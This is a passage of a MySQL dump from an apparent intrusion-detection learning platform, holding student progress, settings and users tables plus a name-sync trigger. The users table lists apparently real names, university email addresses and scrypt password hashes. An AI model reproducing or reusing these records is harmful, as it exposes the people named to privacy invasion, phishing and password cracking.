Gregory','hybrid-detection',0,0,'Overview',1,0,0,0,0,0,5,'2025-09-27 02:04:52'),(210,10,'student 1','signature-based-detection',0,0,'Overview',1,0,1,1,1,5,5,'2025-09-27 02:27:45'),(211,1,'','signature-based-detection',0,0,'',3682,0,1,1,1,5,5,'2025-09-27 02:04:52'),(212,10,'','anomaly-based-detection',0,0,'Overview',2,0,1,0,0,0,0,'2025-09-30 12:56:46'),(214,11,'','signature-based-detection',0,0,'',1,0,1,0,0,0,0,'2025-09-27 04:06:32'),(215,11,'','anomaly-based-detection',0,0,'',0,0,0,0,0,0,0,'2025-09-27 03:45:27'),(216,11,'','hybrid-detection',0,0,'',0,0,0,0,0,0,0,'2025-09-27 03:45:27'),(218,12,'','signature-based-detection',0,0,'',1,0,1,0,0,0,0,'2025-09-27 04:41:03'),(219,12,'','anomaly-based-detection',0,0,'',0,0,0,0,0,0,0,'2025-09-27 04:40:56'),(220,12,'','hybrid-detection',0,0,'',0,0,0,0,0,0,0,'2025-09-27 04:40:56'),(222,13,'Hanz Hendrick','signature-based-detection',0,0,'',259,0,1,0,0,1,5,'2025-10-08 14:01:29'),(223,13,'Hanz Hendrick','anomaly-based-detection',0,0,'',1,0,1,0,0,0,0,'2025-10-08 14:01:29'),(224,13,'Hanz Hendrick','hybrid-detection',0,0,'',2,0,1,0,0,0,0,'2025-10-08 14:01:29'),(243,16,'','signature-based-detection',0,0,'',0,0,0,0,0,0,0,'2025-10-08 13:59:33'),(244,16,'','anomaly-based-detection',0,0,'',0,0,0,0,0,0,0,'2025-10-08 13:59:33'),(245,16,'','hybrid-detection',0,0,'',0,0,0,0,0,0,0,'2025-10-08 13:59:33'),(246,17,'','signature-based-detection',0,0,'',1695,0,1,0,0,1,5,'2025-10-09 05:37:30'),(247,17,'','anomaly-based-detection',0,0,'',0,0,0,0,0,0,0,'2025-10-08 17:01:23'),(248,17,'','hybrid-detection',0,0,'',0,0,0,0,0,0,0,'2025-10-08 17:01:23'),(252,18,'','signature-based-detection',0,0,'',444,0,1,0,0,1,5,'2025-10-09 10:03:49'),(253,18,'','anomaly-based-detection',0,0,'',0,0,0,0,0,0,0,'2025-10-09 05:38:24'),(254,18,'','hybrid-detection',0,0,'',0,0,0,0,0,0,0,'2025-10-09 05:38:24');
/*!40000 ALTER TABLE `student_progress` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `student_progress_backup`
--

DROP TABLE IF EXISTS `student_progress_backup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `student_progress_backup` (
  `id` int NOT NULL AUTO_INCREMENT,
  `student_id` int NOT NULL,
  `student_name` varchar(255) DEFAULT NULL,
  `module_name` varchar(255) DEFAULT NULL,
  `lessons_completed` int DEFAULT NULL,
  `total_lessons` int DEFAULT NULL,
  `last_lesson` varchar(255) DEFAULT NULL,
  `time_spent` int DEFAULT NULL,
  `engagement_score` int DEFAULT NULL,
  `overview_completed` tinyint(1) DEFAULT '0',
  `practical_completed` tinyint(1) DEFAULT '0',
  `assessment_completed` tinyint(1) DEFAULT '0',
  `quizzes_passed` int DEFAULT '0',
  `total_quizzes` int DEFAULT '0',
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `unique_student_module` (`student_id`,`module_name`),
  UNIQUE KEY `uniq_student_module` (`student_id`,`module_name`)
) ENGINE=InnoDB AUTO_INCREMENT=225 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `student_progress_backup`
--

LOCK TABLES `student_progress_backup` WRITE;
/*!40000 ALTER TABLE `student_progress_backup` DISABLE KEYS */;
INSERT INTO `student_progress_backup` VALUES (146,1,'Hanz Hendrick Lacsi','anomaly-based-detection',0,12,'What is Anomaly-Based Detection?',18,0,0,0,0,0,5,'2025-09-27 02:04:52'),(192,5,'Danlie Ken Gregory','signature-based-detection',0,0,'Overview',4,0,0,0,0,0,5,'2025-09-27 02:04:52'),(195,6,'Hanz Hendrick Lacsi','signature-based-detection',0,0,'Overview',12,0,0,0,0,0,5,'2025-09-27 02:04:52'),(196,6,'Hanz Hendrick Lacsi','anomaly-based-detection',0,0,'Overview',3,0,0,0,0,0,5,'2025-09-27 02:04:52'),(201,7,'Angel Bless Mendoza','signature-based-detection',0,0,'Overview',4,0,0,0,0,0,5,'2025-09-27 02:04:52'),(204,7,'Angel Bless Mendoza','anomaly-based-detection',0,0,'Overview',1,0,0,0,0,0,5,'2025-09-27 02:04:52'),(205,7,'Angel Bless Mendoza','hybrid-detection',0,0,'Overview',1,0,0,0,0,0,5,'2025-09-27 02:04:52'),(206,8,'Hanz Hendrick Lacsi','signature-based-detection',0,0,'Overview',2,0,0,0,0,0,5,'2025-09-27 02:04:52'),(207,9,'Danlie Ken Gregory','signature-based-detection',0,0,'Overview',1,0,0,0,0,0,5,'2025-09-27 02:04:52'),(208,9,'Danlie Ken Gregory','anomaly-based-detection',0,0,'Overview',1,0,0,0,0,0,5,'2025-09-27 02:04:52'),(209,9,'Danlie Ken Gregory','hybrid-detection',0,0,'Overview',1,0,0,0,0,0,5,'2025-09-27 02:04:52'),(210,10,'student 1','signature-based-detection',0,0,'Overview',1,0,1,1,1,5,5,'2025-09-27 02:27:45'),(211,1,'','signature-based-detection',0,0,'',3682,0,1,1,1,5,5,'2025-09-27 02:04:52'),(212,10,'','anomaly-based-detection',0,0,'',0,0,1,0,0,0,0,'2025-09-27 03:36:27'),(213,10,'student 1','Anomaly-Based Detection',0,0,'Overview',2,0,0,0,0,0,0,'2025-09-27 03:36:30'),(214,11,'','signature-based-detection',0,0,'',1,0,1,0,0,0,0,'2025-09-27 04:06:32'),(215,11,'','anomaly-based-detection',0,0,'',0,0,0,0,0,0,0,'2025-09-27 03:45:27'),(216,11,'','hybrid-detection',0,0,'',0,0,0,0,0,0,0,'2025-09-27 03:45:27'),(218,12,'','signature-based-detection',0,0,'',1,0,1,0,0,0,0,'2025-09-27 04:41:03'),(219,12,'','anomaly-based-detection',0,0,'',0,0,0,0,0,0,0,'2025-09-27 04:40:56'),(220,12,'','hybrid-detection',0,0,'',0,0,0,0,0,0,0,'2025-09-27 04:40:56'),(222,13,'','signature-based-detection',0,0,'',259,0,1,0,0,1,5,'2025-09-30 02:44:28'),(223,13,'','anomaly-based-detection',0,0,'',1,0,1,0,0,0,0,'2025-09-27 06:23:14'),(224,13,'','hybrid-detection',0,0,'',2,0,1,0,0,0,0,'2025-09-27 06:29:31');
/*!40000 ALTER TABLE `student_progress_backup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `student_section_progress`
--

DROP TABLE IF EXISTS `student_section_progress`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `student_section_progress` (
  `id` int NOT NULL AUTO_INCREMENT,
  `student_id` int NOT NULL,
  `module_name` varchar(255) NOT NULL,
  `section_name` varchar(255) NOT NULL,
  `completed` tinyint(1) DEFAULT '0',
  `unlocked` tinyint(1) DEFAULT '0',
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `student_id` (`student_id`,`module_name`,`section_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `student_section_progress`
--

LOCK TABLES `student_section_progress` WRITE;
/*!40000 ALTER TABLE `student_section_progress` DISABLE KEYS */;
/*!40000 ALTER TABLE `student_section_progress` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `student_settings`
--

DROP TABLE IF EXISTS `student_settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `student_settings` (
  `student_id` int NOT NULL,
  `notifications_text` longtext,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`student_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `student_settings`
--

LOCK TABLES `student_settings` WRITE;
/*!40000 ALTER TABLE `student_settings` DISABLE KEYS */;
INSERT INTO `student_settings` VALUES (7,'{\"email\": true, \"browser\": true, \"moduleUpdates\": true, \"assessmentResults\": true}','2025-10-05 09:31:35'),(8,'{\"email\": true, \"browser\": true, \"moduleUpdates\": true, \"assessmentResults\": true}','2025-10-05 09:31:35'),(9,'{\"email\": true, \"browser\": true, \"moduleUpdates\": true, \"assessmentResults\": true}','2025-10-05 09:31:35'),(10,'{\"email\": true, \"browser\": true, \"moduleUpdates\": true, \"assessmentResults\": true}','2025-10-05 09:31:35'),(11,'{\"email\": true, \"browser\": true, \"moduleUpdates\": true, \"assessmentResults\": true}','2025-10-05 09:31:35'),(12,'{\"email\": true, \"browser\": true, \"moduleUpdates\": true, \"assessmentResults\": true}','2025-10-05 09:31:35'),(13,'{\"email\": true, \"browser\": true, \"moduleUpdates\": true, \"assessmentResults\": false}','2025-10-05 09:25:51');
/*!40000 ALTER TABLE `student_settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `submissions`
--

DROP TABLE IF EXISTS `submissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `submissions` (
  `id` int NOT NULL AUTO_INCREMENT,
  `student_id` int NOT NULL,
  `student_name` varchar(255) NOT NULL,
  `module_slug` varchar(255) NOT NULL,
  `module_title` varchar(255) NOT NULL,
  `submission_type` enum('practical','assessment') NOT NULL,
  `payload` json DEFAULT NULL,
  `totals_rule_count` int DEFAULT '0',
  `totals_total_matches` int DEFAULT '0',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `idx_student_id` (`student_id`),
  KEY `idx_created_at` (`created_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `submissions`
--

LOCK TABLES `submissions` WRITE;
/*!40000 ALTER TABLE `submissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `submissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `password_hash` varchar(255) NOT NULL,
  `userType` enum('student','instructor','admin') NOT NULL,
  `status` enum('pending','approved','rejected') NOT NULL DEFAULT 'approved',
  PRIMARY KEY (`id`),
  UNIQUE KEY `email` (`email`),
  CONSTRAINT `chk_users_lspu_email` CHECK (((`userType` = _utf8mb4'admin') or (`email` like _utf8mb4'%@lspu.edu.ph')))
) ENGINE=InnoDB AUTO_INCREMENT=19 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (2,'Test Instructor','test.instructor@lspu.edu.ph','scrypt:32768:8:1$13LbZsHmV7mnIPLV$f49458dfe57c81bd7694b3d0dfeaaabf63a2679d9f9c9bcbb12de73bf905f2ce1f42ddc6ea3dfb63bcfd62ce84bcbabee66fa9bbb3af1dd91f316a358542ef11','instructor','approved'),(7,'Angel Bless Mendoza','angelbless.mendoza@lspu.edu.ph','scrypt:32768:8:1$Nm23LbLQHFRiGE8e$5bb3f326d3ab0ce3194fcc6738d254708a18bf5ea4e8197a1056e9cf09c17b6faee1665d47008f49d3f87f722440ef258170c68ae131582619acb6b9d93c55d1','student','approved'),(8,'Hanz Hendrick Lacsi','hanzhendrick.lacsi@lspu.edu.ph','scrypt:32768:8:1$VTU8MC67Q0WM3uqh$6766834827338837ce7df9d6a599d0d6cbf9bb96999d407281239428fbfedd238787197b1450d0631e1b8138c8d9828b0f08c44de39592eb3c01983eb1076a07','student','approved'),(9,'Danlie Ken Gregory','danlieken.gregory@lspu.edu.ph','scrypt:32768:8:1$NJW811YWSn9mcyHY$716f6d5e2a0646d3c8383f7b28b67f5c15d5867ee3bbe7eb2fc871222e379192e7b0f645e45d2e05e874e189a5996e7264f87878a5efe35f8df2958e698f6ca1','student','approved'),(10,'student 1','student.1@lspu.edu.ph','scrypt:32768:8:1$IlYOZgfABqgGE1ct$5e996ab7de4cc5f1fd99651d9366f24bd449ca03b2ccb98a4d1debbfcee3bcefcefb3aad9c423f199ecd5e1c3b8c9d71e45638792d3bef3b0903c58f7e2c1e37','student','approved'),(11,'exiv exigencies','exiv.exigencies@lspu.edu.ph','scrypt:32768:8:1$OYlS6RcKjiT2cC07$2bfa63374c1af9f3730b8f2281afba8000e14827f780f9d22a159f50f1115c4bce5ddfb3963d93b5318dea6fcaa0545e3e768432d0fbf078caa4b05ab5fd4377','student','approved'),(12,'student 2','student.2@lspu.edu.ph','scrypt:32768:8:1$TiAbYmqNbuE0iNJw$7b28dcfbedae2d06826d4df69c8cadca902aeaf440af7618bf621583fe61bf51f840b23ff9092def18a34dea2596a7aaf9dc7b8eba9cae613091bb1673affbd7','student','approved'),(13,'Hanz Hendrick','student.3@lspu.edu.ph','scrypt:32768:8:1$0uE4wr0rR8wLpgFh$c1941c5620f6ceeb36ed49300179875bd4bdbe6e7d05d58fbf215358f3dd8366447c901a8aa6ebf5a39e911245c2bc98c41191712b18f25bea4fa4815af8adee','student','approved'),(14,'Test Instructor 2','test.instructor2@lspu.edu.ph','scrypt:32768:8:1$WrDeUYk6C4f1eXA6$422eb977ad527f933a9a0a2e99615454d5fd213a2b3095152ad2354b0df4540b6ffb5a49a8932335f5a23f8bbccb04e545bf447d36f60500f39a57a732426a15','instructor','pending'),(15,'Test Instructor 4','test.instructor4@lspu.edu.ph','scrypt:32768:8:1$SAIlNXgnsLM6HFuL$330628b5f0707b1bcbdaaf8e9eae0e22fa16506002c8a376f6e61e219bada27b2396328c5f570b491c858a97e7f248ece643eb397c4520a3ef8102810a73a1ca','instructor','pending'),(16,'Juan Dela Cruz','juan.delacruz@lspu.edu.ph','scrypt:32768:8:1$HKiM1VM4rWR3cLLs$29678eadac7581d79297c01770ccbfbed9597fd74d85135af4228dcf635935370419d7517e2eb6c2bcbdf027897b4f6181fa920e268b2e951f3aa1d921a5f1b9','student','approved'),(17,'student 4','student.4@lspu.edu.ph','scrypt:32768:8:1$Gu0FTdKm7WdLkgUi$510c1d697bbe0a7f2773de07689661e0445df07e3955d567d16253c05d72e1bc4b264d2fabfdca7f5ebc23febd230deb34080997bda4ed85c65e58fae4fd8b68','student','approved'),(18,'student 5','student.5@lspu.edu.ph','scrypt:32768:8:1$FzRltioo5RhlorU8$e6fe9d5b5c296e85da236640c43a394d69e67411bd4188b97443209ff8f1ac80eb15f809f89a4398b2bd6d90c018b72b331369a22e03a1f87fa2ef0ab82e471f','student','approved');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!50003 SET @saved_cs_client      = @@character_set_client */ ;
/*!50003 SET @saved_cs_results     = @@character_set_results */ ;
/*!50003 SET @saved_col_connection = @@collation_connection */ ;
/*!50003 SET character_set_client  = utf8mb4 */ ;
/*!50003 SET character_set_results = utf8mb4 */ ;
/*!50003 SET collation_connection  = utf8mb4_0900_ai_ci */ ;
/*!50003 SET @saved_sql_mode       = @@sql_mode */ ;
/*!50003 SET sql_mode              = 'ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION' */ ;
DELIMITER ;;
/*!50003 CREATE*/  /*!50003 TRIGGER `trg_sync_student_name` AFTER UPDATE ON `users` FOR EACH ROW BEGIN
  IF NEW.userType = 'student' AND NEW.name <> OLD.name THEN
    UPDATE student_progress
      SET student_name = NEW.name
      WHERE student_id = NEW.id;
  END IF;
END */;;
DELIMITER ;
/*!50003 SET sql_mode              = @saved_sql_mode */ ;
/*!50003 SET character_set_client  = @saved_cs_client */ ;
/*!50003 SET character_set_results = @saved_cs_results */ ;
/*!50003 SET collation_connection  = @saved_col_connection */ ;

--
-- Dumping events for database 'nids_to_know'
--

--
-- Dumping routines for database 'nids_to_know'
--
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-10-10  0:50:34
